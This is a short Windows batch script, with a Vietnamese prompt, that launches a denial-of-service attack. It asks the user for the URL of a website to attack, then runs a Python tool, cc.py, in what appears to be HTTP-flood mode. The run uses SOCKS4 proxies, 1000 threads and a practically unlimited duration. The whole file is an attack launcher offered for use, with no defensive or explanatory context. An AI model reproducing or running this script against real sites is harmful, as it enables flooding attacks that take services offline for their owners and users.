echo @off
del socks4.txt
set /p SETURL="Nhập URL trang web cần tấn công: "
python3 cc.py -url %SETURL% -m cc -v 4 -t 1000 -f socks4.txt -b 1 -s 999999999999999 -down -check